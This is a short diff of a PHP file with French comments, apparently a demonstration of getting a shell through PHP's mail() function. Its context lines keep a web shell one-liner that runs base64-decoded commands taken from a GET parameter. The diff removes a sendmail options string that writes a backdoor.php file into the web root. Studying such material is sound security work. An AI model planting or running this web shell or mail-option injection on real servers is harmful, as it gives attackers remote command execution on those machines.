@@ -22,6 +22,7 @@ exemple 2 : exécution d'un shell
 <?php echo "|".system(base64_decode($_GET["cmd"]))."|<br />"; ?>
 
 
+
 /**************************************************************************/
 
 
@@ -33,7 +34,6 @@ $subject = "Test";
 
 $message = $_POST['message'];
 $headers = '';
-$options = "-OQueueDirectory=/tmp -X/var/www/html/backdoor.php";
 if(mail($to, $subject, $message, $headers, $options))
  echo 'ok';
 else 
